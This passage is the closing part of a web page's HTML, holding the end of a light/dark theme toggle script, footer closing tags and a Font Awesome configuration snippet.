	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
